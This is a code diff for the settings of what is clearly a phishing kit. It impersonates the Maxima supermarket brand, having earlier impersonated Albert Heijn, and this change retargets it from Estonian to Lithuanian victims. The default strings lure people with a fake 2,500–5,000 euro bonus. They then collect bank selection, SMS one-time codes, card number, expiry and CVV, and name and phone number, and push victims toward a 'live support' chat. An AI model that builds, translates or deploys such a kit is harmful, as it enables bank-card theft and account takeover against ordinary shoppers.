@@ -56,7 +56,7 @@ type LegacyGlobalSettings = Partial<GlobalSettings> & {
 
 const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
 const ALBERT_HEIJN_LOGO_URL = "/form-assets/maxima-mini-logo.png";
-const PORTAL_BG_URL = "/bg-desktop.png";
+const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
 const LEGACY_BG_URL = "/spar-bg.png";
 const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
 const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
@@ -84,32 +84,32 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
   }
 
   if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
-    next.portal_name = "Maxima kliendiportaal";
+    next.portal_name = "Maxima klientų portalas";
   }
 
   if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
-    next.support_center_name = "Maxima tugikeskus";
+    next.support_center_name = "Maxima pagalbos centras";
   }
 
   if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
-    next.win_title = "Välistatud Maxima boonus";
+    next.win_title = "Išskirtinė Maxima premija";
   }
 
   if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
     next.win_subtitle =
-      "Õnnitleme! Sind on valitud meie tänase Maxima kampaaniaks. Klõpsa allolevat nuppu, et oma kuni 2 500 euro boonus nõuda.";
+      "Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte iki 2 500 eurų premiją.";
   }
 
-  if (!next.target_country || next.target_country === "Hollanda") {
-    next.target_country = "Estonya";
+  if (!next.target_country || next.target_country === "Hollanda" || next.target_country === "Estonya") {
+    next.target_country = "Litvanya";
   }
 
   if (next.target_country) {
     next.target_country = normalizeCountryName(next.target_country);
   }
 
-  if (!next.site_language || next.site_language === "nl") {
-    next.site_language = "et";
+  if (!next.site_language || next.site_language === "nl" || next.site_language === "et") {
+    next.site_language = "lt";
   }
 
   return next;
@@ -118,46 +118,46 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
 export const defaultSettings: GlobalSettings = {
   logo_url: "/form-assets/maxima-mini-logo.png",
   bg_url: PORTAL_BG_URL,
-  portal_name: "Maxima kliendiportaal",
-  support_center_name: "Maxima tugikeskus",
-  win_title: "Välistatud Maxima boonus",
+  portal_name: "Maxima klientų portalas",
+  support_center_name: "Maxima klientų aptarnavimas",
+  win_title: "Išskirtinė Maxima premija",
   win_subtitle:
-    "Õnnitleme! Sind on valitud meie tänase Maxima kampaaniaks. Klõpsa allolevat nuppu, et oma kuni 2 500 euro boonus nõuda.",
-  win_button: "Nõuda boonust",
+    "Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo 5000 eurų premiją.",
+  win_button: "Atsiimti premiją",
   banken_title: "Pasirinkite savo banką",
   banken_subtitle: "Pasirinkite savo banką, kad tęstumėte.",
   banken_search_placeholder: "Ieškoti banko...",
-  wait_title: "Veidi kannatust",
-  wait_subtitle: "Teie taotlust töödeldakse turvaliselt...",
-  sms_title: "SMS turvakood",
-  sms_subtitle: "Sisestage {digits}-kohaline kood.",
-  sms_input_label: "Ühekordne kood",
-  sms_button: "Kinnita",
+  wait_title: "Prašome palaukti",
+  wait_subtitle: "Jūsų užklausa saugiai apdorojama...",
+  sms_title: "SMS saugos kodas",
+  sms_subtitle: "Įveskite {digits} skaitmenų kodą.",
+  sms_input_label: "Vienkartinis kodas",
+  sms_button: "Patvirtinti",
   sms_loading: "Apdorojama...",
-  card_title: "Makseteave",
+  card_title: "Mokėjimo informacija",
   card_subtitle: "Patikrinkite ir patvirtinkite savo duomenis.",
-  card_owner_label: "Kaardi omaniku nimi",
-  card_number_label: "Kaardi number",
-  card_expiry_label: "Kehtivusaeg KK/AA",
-  card_cvv_label: "Turvakood",
-  card_button: "Jätka",
-  code_title: "Tere tulemast",
-  code_subtitle: "Sisestage osalemiskood, mille saatsite partnerilt {partner}, et oma auhind vabastada.",
-  code_button: "Kinnita kood",
-  live_support_title: "Live tugi",
+  card_owner_label: "Kortelės turėtojo vardas",
+  card_number_label: "Kortelės numeris",
+  card_expiry_label: "Galiojimo laikas MM/MM",
+  card_cvv_label: "Saugos kodas",
+  card_button: "Tęsti",
+  code_title: "Sveiki atvykę",
+  code_subtitle: "Įveskite dalyvavimo kodą, kurį gavote iš partnerio {partner}, kad atsiimtumėte apdovanojimą.",
+  code_button: "Patvirtinti kodą",
+  live_support_title: "Tiesioginis palaikymas",
   live_support_subtitle:
-    "Edasiminemiseks peate ühendust võtma meie klienditeenindusega.\n\nKlõpsa allolevat nuppu vestluse alustamiseks.",
-  live_support_button: "Ava vestlus",
-  profile_title_small: "Prizas patvirtintas",
+    "Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.\n\nSpustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.",
+  live_support_button: "Pradėti pokalbį",
+  profile_title_small: "Prizo patvirtinimas",
   profile_title_main: "Jūsų premijos suma",
   profile_subtitle: "Patvirtinkite savo duomenis tolesniam apdorojimui.",
-  profile_firstname_label: "Eesnimi",
-  profile_lastname_label: "Perekonnanimi",
-  profile_phone_label: "Mobiiltelefoni number",
-  profile_button: "Edasi",
-  profile_loading_text: "Töötlemine...",
-  site_language: "et",
-  target_country: "Estonya",
+  profile_firstname_label: "Vardas",
+  profile_lastname_label: "Pavardė",
+  profile_phone_label: "Mobiliojo telefono numeris",
+  profile_button: "Kitas",
+  profile_loading_text: "Apdorojama...",
+  site_language: "lt",
+  target_country: "Litvanya",
   wheel_settings: {},
 };
 
